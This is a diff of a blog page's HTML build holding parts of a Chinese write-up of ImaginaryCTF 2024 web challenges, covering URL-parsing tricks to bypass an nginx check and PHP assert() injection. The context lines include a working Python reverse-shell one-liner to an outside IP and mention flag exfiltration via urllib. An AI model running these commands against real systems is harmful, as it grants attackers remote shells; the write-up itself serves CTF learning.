@@ -102,7 +102,7 @@
 
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/931c692/"><span class="title">文件上传漏洞</span></a><a class="item title" href="/posts/895d3c4b/"><span class="title">中间件漏洞</span></a><a class="item title" href="/posts/e73517db/"><span class="title">SQL注入</span></a><a class="item title" href="/posts/fbcd83ad/"><span class="title">2024KalmarCTF-WEB复盘</span></a><a class="item title" href="/posts/b1f1aefc/"><span class="title">常见协议与PHP伪协议</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/e73517db/"><span class="title">SQL注入</span></a><a class="item title" href="/posts/931c692/"><span class="title">文件上传漏洞</span></a><a class="item title" href="/posts/895d3c4b/"><span class="title">中间件漏洞</span></a><a class="item title" href="/posts/fbcd83ad/"><span class="title">2024KalmarCTF-WEB复盘</span></a><a class="item title" href="/posts/b1f1aefc/"><span class="title">常见协议与PHP伪协议</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -146,7 +146,7 @@
 
 <p>所以这道题目很明显的目的就是要绕过nginx的文件检测<code>if (-f $request_filename)</code>，但要在node的这个web程序中能被读取</p>
 <p>一通乱尝试</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/e7612c577daeb5ab6286268d090b6127.png" class="lazy" title="e7612c577daeb5ab6286268d090b6127">
+<img src="/posts/25584ce3/e7612c577daeb5ab6286268d090b6127.png" class="" title="e7612c577daeb5ab6286268d090b6127">
 
 <p><strong>原理分析</strong></p>
 <h1 id="readme2"><a href="#readme2" class="headerlink" title="readme2"></a>readme2</h1><blockquote>
@@ -163,20 +163,20 @@
 
 <p>读<code>app.js</code>可以知道后端起了两个服务，对外开放的是<code>4000</code>端口，很明显想要拿到flag，最终需要通过<code>4000</code>端口，访问到<code>3000</code>端口，且url开头以<code>flag.txt</code>。</p>
 <h2 id="思路一：-利用host"><a href="#思路一：-利用host" class="headerlink" title="思路一： 利用host"></a>思路一： 利用host</h2><p>最开始尝试想能不能利用请求头<code>host</code>，并通过<code>/..</code>最终绕过检测，发现</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240727233107973.png" class="lazy" title="image-20240727233107973">
+<img src="/posts/25584ce3/image-20240727233107973.png" class="" title="image-20240727233107973">
 
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240727233223182.png" class="lazy" title="image-20240727233223182">
+<img src="/posts/25584ce3/image-20240727233223182.png" class="" title="image-20240727233223182">
 
 <h3 id="特性1：-自动处理-穿梭至上一级url处"><a href="#特性1：-自动处理-穿梭至上一级url处" class="headerlink" title="特性1： 自动处理/..穿梭至上一级url处"></a>特性1： 自动处理<code>/..</code>穿梭至上一级url处</h3><p>传入</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728013859135.png" class="lazy" title="image-20240728013859135">
+<img src="/posts/25584ce3/image-20240728013859135.png" class="" title="image-20240728013859135">
 
 <p>会发现双<code>/test</code>消失，原因为第1次传入后，url由于有<code>..</code>所以，所以第一次的url的pathname部分只剩下<code>/</code>，如下图</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728014228713.png" class="lazy" title="image-20240728014228713">
+<img src="/posts/25584ce3/image-20240728014228713.png" class="" title="image-20240728014228713">
 
 
 
 <h3 id="特性2：-url属性是请求包host-get参数的结果"><a href="#特性2：-url属性是请求包host-get参数的结果" class="headerlink" title="特性2： url属性是请求包host+get参数的结果"></a>特性2： url属性是请求包host+get参数的结果</h3><p>最终传入3000端口的url的pathname变成了<code>/test/test</code></p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240727233107973.png" class="lazy" title="image-20240727233107973">
+<img src="/posts/25584ce3/image-20240727233107973.png" class="" title="image-20240727233107973">
 
 <blockquote>
 <p>原因：通过代码最后一段可以发现</p>
@@ -188,14 +188,14 @@
 <p>但此时url的pathname处以及有了一个<code>/test</code>所以最后pathname出现双<code>/test</code></p>
 </blockquote>
 <h3 id="特性3：通过拼接的url会自动省略-t（tab键）"><a href="#特性3：通过拼接的url会自动省略-t（tab键）" class="headerlink" title="特性3：通过拼接的url会自动省略 \t（tab键）"></a>特性3：通过拼接的url会自动省略 <code>\t</code>（tab键）</h3><p>发送的请求包如下</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728015332102.png" class="lazy" title="image-20240728015332102">
+<img src="/posts/25584ce3/image-20240728015332102.png" class="" title="image-20240728015332102">
 
 <p>在传入后获得的url为</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728015500581.png" class="lazy" title="image-20240728015500581">
+<img src="/posts/25584ce3/image-20240728015500581.png" class="" title="image-20240728015500581">
 
 <p><strong>发现<code>\t</code>被自动忽略了</strong></p>
 <p>由于在对于<code>/..</code>的处理是在程序运行前，所以可以进行搭配</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728020017631.png" class="lazy" title="image-20240728020017631">
+<img src="/posts/25584ce3/image-20240728020017631.png" class="" title="image-20240728020017631">
 
 <blockquote>
 <p>分析一波</p>
@@ -220,8 +220,8 @@
 <p>即我们最终在</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">return fetch(new URL(url.pathname + url.search, &#x27;http://localhost:3000/&#x27;), &#123;</span><br><span class="line">    method: req.method,</span><br><span class="line">    headers: req.headers,</span><br><span class="line">    body: req.body</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
-<p><code>url.pathname</code> 要以<code>//</code>开头，尝试直接以<code>//</code>传入，发现是可行的<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/c270631a0ef222268d0c80099c4b72af.png" class="lazy" title="c270631a0ef222268d0c80099c4b72af"></p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240727162952833.png" class="lazy" title="image-20240727162952833">
+<p><code>url.pathname</code> 要以<code>//</code>开头，尝试直接以<code>//</code>传入，发现是可行的<img src="/posts/25584ce3/c270631a0ef222268d0c80099c4b72af.png" class="" title="c270631a0ef222268d0c80099c4b72af"></p>
+<img src="/posts/25584ce3/image-20240727162952833.png" class="" title="image-20240727162952833">
 
 
 
@@ -234,13 +234,13 @@
 <blockquote>
 <p>具体原理的话，需要看bun框架对url参数的处理方式</p>
 </blockquote>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728022113792.png" class="lazy" title="image-20240728022113792">
+<img src="/posts/25584ce3/image-20240728022113792.png" class="" title="image-20240728022113792">
 
 <p>即最后的请求包为</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728022457014.png" class="lazy" title="image-20240728022457014">
+<img src="/posts/25584ce3/image-20240728022457014.png" class="" title="image-20240728022457014">
 
 <p>可以看到url的pathname部分并没有<code>/</code>开头</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728022540214.png" class="lazy" title="image-20240728022540214">
+<img src="/posts/25584ce3/image-20240728022540214.png" class="" title="image-20240728022540214">
 
 
 
@@ -254,12 +254,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="variable">$filepath</span> = <span class="string">&#x27;./files/&#x27;</span> . <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filepath</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;File not found!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>能导致漏洞的就是<code>assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;)</code>，由于采用字符串凭借，所以assert()函数(官方文档指路：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">PHP: assert - Manual</a>)中执行的代码基本上是可控的</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240728134010620.png" class="lazy" title="image-20240728134010620">
+<img src="/posts/25584ce3/image-20240728134010620.png" class="" title="image-20240728134010620">
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@2419de65327b:/var/www/html# php -v</span><br><span class="line">PHP 7.4.33 (cli) (built: Nov 15 2022 06:03:30) ( NTS )</span><br><span class="line">Copyright (c) The PHP Group</span><br><span class="line">Zend Engine v3.4.0, Copyright (c) Zend Technologies</span><br></pre></td></tr></table></figure>
 
 <p>经过测试发现，在此版本中确实被php代码执行，但由于<code>strpos()</code>有返回值了，所以需要在<code>strpos()</code>中进行拼接，最后playload</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/0c997be916d7493419331d129c081b49.png" class="lazy" title="0c997be916d7493419331d129c081b49">
+<img src="/posts/25584ce3/0c997be916d7493419331d129c081b49.png" class="" title="0c997be916d7493419331d129c081b49">
 
 
 
@@ -284,26 +284,26 @@
 
 <p>最开始看到<code>timeout=0.1</code><del>还以为python与php一样，执行子进程的时间算作整体时间</del>，0.1秒反弹出shell好像并没有啥用，实际上是可以反弹出shell，<code>timeout=0.1</code>对反弹shell并没有影响</p>
 <p>去hacktools里生成一个python的反弹shell语句</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240729012746191.png" class="lazy" title="image-20240729012746191">
+<img src="/posts/25584ce3/image-20240729012746191.png" class="" title="image-20240729012746191">
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;1.1.1.1&quot;,8077));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>贴上去</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240729012929786.png" class="lazy" title="image-20240729012929786">
+<img src="/posts/25584ce3/image-20240729012929786.png" class="" title="image-20240729012929786">
 
 <p>虽然页面会报500错误</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240729012624771.png" class="lazy" title="image-20240729012624771">
+<img src="/posts/25584ce3/image-20240729012624771.png" class="" title="image-20240729012624771">
 
 <p>成功反弹到shell</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240729012558399.png" class="lazy" title="image-20240729012558399">
+<img src="/posts/25584ce3/image-20240729012558399.png" class="" title="image-20240729012558399">
 
 
 
 <h2 id="思路二：-利用urllib库"><a href="#思路二：-利用urllib库" class="headerlink" title="思路二： 利用urllib库"></a>思路二： 利用<code>urllib</code>库</h2><p>这个思路就是直接读取文件，然后因为系统命令行中没有curl命令使用，且没有<code>requests</code>库，但可以依靠原生的<code>urllib</code>库，将flag外带出来</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240729014153989.png" class="lazy" title="image-20240729014153989">
+<img src="/posts/25584ce3/image-20240729014153989.png" class="" title="image-20240729014153989">
 
 <p>虽然也500，但最终也是拿到了flag</p>
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/posts/25584ce3/image-20240729014234275.png" class="lazy" title="image-20240729014234275">
+<img src="/posts/25584ce3/image-20240729014234275.png" class="" title="image-20240729014234275">
 
 
 
@@ -331,11 +331,11 @@
       <div class="header"><span>分享文章</span></div>
       <div class="body">
         <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://blog.wells.host/posts/25584ce3/" /></div>
-        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://blog.wells.host/posts/25584ce3/&title=2024ImaginaryCtf-WEB复盘 - Wells's Blog&summary=靶场链接：https://2024.imaginaryctf.org/
-官方WP指路：https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/tree/m..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=2024ImaginaryCtf-WEB复盘 - Wells's Blog&amp;body=https://blog.wells.host/posts/25584ce3/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://blog.wells.host/posts/25584ce3/&title=2024ImaginaryCtf-WEB复盘 - Wells's Blog&summary=靶场链接：https://2024.imaginaryctf.org/
+官方WP指路：https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/tree/m..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=2024ImaginaryCtf-WEB复盘 - Wells's Blog&amp;body=https://blog.wells.host/posts/25584ce3/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
         
         <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
-          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://blog.wells.host/posts/25584ce3/"/>
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://blog.wells.host/posts/25584ce3/"/>
         </div>
         
       </div>
@@ -769,27 +769,7 @@
     hoverDelay: 25
   };
 </script>
-<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
-<script>
-  // https://www.npmjs.com/package/vanilla-lazyload
-  // Set the options globally
-  // to make LazyLoad self-initialize
-  window.lazyLoadOptions = {
-    elements_selector: ".lazy",
-  };
-  // Listen to the initialization event
-  // and get the instance of LazyLoad
-  window.addEventListener(
-    "LazyLoad::Initialized",
-    function (event) {
-      window.lazyLoadInstance = event.detail.instance;
-    },
-    false
-  );
-  document.addEventListener('DOMContentLoaded', function () {
-    window.lazyLoadInstance?.update();
-  });
-</script><script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
   ctx.fancybox = {
     selector: `.timenode p>img`,
     css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
